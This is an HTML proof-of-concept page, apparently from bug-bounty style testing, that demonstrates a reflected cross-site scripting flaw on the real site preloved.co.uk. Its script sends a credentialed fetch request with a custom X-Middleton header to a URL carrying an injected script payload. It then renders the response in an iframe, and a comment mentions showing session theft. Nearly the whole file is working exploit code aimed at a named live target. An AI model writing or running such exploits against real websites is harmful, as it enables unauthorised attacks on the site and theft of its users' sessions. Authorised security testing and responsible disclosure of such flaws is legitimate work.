<!DOCTYPE html>
<html>
<head>
<title>XSS PoC</title>
</head>
<body>
<h2>Testing XSS...</h2>

<script>
// Use fetch to send the request with X-Middleton header
// This will make the request from the victim's browser
fetch('https://www.preloved.co.uk/?--><script>alert(document.domain)<\/script>', {
    method: 'GET',
    headers: {
        'X-Middleton': '12312asd'
    },
    credentials: 'include'  // Include cookies to show session theft
})
.then(response => response.text())
.then(data => {
    // Inject the response into the page to demonstrate the XSS
    // The XSS payload is in the response, so we create an iframe to render it
    var iframe = document.createElement('iframe');
    iframe.srcdoc = data;
    iframe.style.width = '100%';
    iframe.style.height = '500px';
    document.body.appendChild(iframe);
})
.catch(err => {
    console.log('Error:', err);
});
</script>

</body>
</html>
